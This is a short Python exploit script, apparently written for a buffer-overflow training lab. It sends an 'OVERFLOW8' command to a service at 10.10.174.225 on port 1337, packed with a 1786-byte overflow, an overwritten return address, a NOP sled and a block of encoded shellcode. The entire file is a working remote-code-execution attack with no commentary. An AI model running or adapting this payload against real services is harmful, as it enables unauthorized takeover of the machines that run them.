#!/usr/bin/env python3

import socket

ip = "10.10.174.225"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xb8\x94\x5d\x7d\x0b\xd9\xcd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x42\x12\x83\xea\xfc\x03\xd6\x53\x9f\xfe\x2a\x83\xdd"
"\x01\xd2\x54\x82\x88\x37\x65\x82\xef\x3c\xd6\x32\x7b\x10\xdb"
"\xb9\x29\x80\x68\xcf\xe5\xa7\xd9\x7a\xd0\x86\xda\xd7\x20\x89"
"\x58\x2a\x75\x69\x60\xe5\x88\x68\xa5\x18\x60\x38\x7e\x56\xd7"
"\xac\x0b\x22\xe4\x47\x47\xa2\x6c\xb4\x10\xc5\x5d\x6b\x2a\x9c"
"\x7d\x8a\xff\x94\x37\x94\x1c\x90\x8e\x2f\xd6\x6e\x11\xf9\x26"
"\x8e\xbe\xc4\x86\x7d\xbe\x01\x20\x9e\xb5\x7b\x52\x23\xce\xb8"
"\x28\xff\x5b\x5a\x8a\x74\xfb\x86\x2a\x58\x9a\x4d\x20\x15\xe8"
"\x09\x25\xa8\x3d\x22\x51\x21\xc0\xe4\xd3\x71\xe7\x20\xbf\x22"
"\x86\x71\x65\x84\xb7\x61\xc6\x79\x12\xea\xeb\x6e\x2f\xb1\x63"
"\x42\x02\x49\x74\xcc\x15\x3a\x46\x53\x8e\xd4\xea\x1c\x08\x23"
"\x0c\x37\xec\xbb\xf3\xb8\x0d\x92\x37\xec\x5d\x8c\x9e\x8d\x35"
"\x4c\x1e\x58\x99\x1c\xb0\x33\x5a\xcc\x70\xe4\x32\x06\x7f\xdb"
"\x23\x29\x55\x74\xc9\xd0\x3e\x71\x03\xc3\x4c\xed\x19\xf3\xa1"
"\xb2\x94\x15\xab\x5a\xf1\x8e\x44\xc2\x58\x44\xf4\x0b\x77\x21"
"\x36\x87\x74\xd6\xf9\x60\xf0\xc4\x6e\x81\x4f\xb6\x39\x9e\x65"
"\xde\xa6\x0d\xe2\x1e\xa0\x2d\xbd\x49\xe5\x80\xb4\x1f\x1b\xba"
"\x6e\x3d\xe6\x5a\x48\x85\x3d\x9f\x57\x04\xb3\x9b\x73\x16\x0d"
"\x23\x38\x42\xc1\x72\x96\x3c\xa7\x2c\x58\x96\x71\x82\x32\x7e"
"\x07\xe8\x84\xf8\x08\x25\x73\xe4\xb9\x90\xc2\x1b\x75\x75\xc3"
"\x64\x6b\xe5\x2c\xbf\x2f\x05\xcf\x15\x5a\xae\x56\xfc\xe7\xb3"
"\x68\x2b\x2b\xca\xea\xd9\xd4\x29\xf2\xa8\xd1\x76\xb4\x41\xa8")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")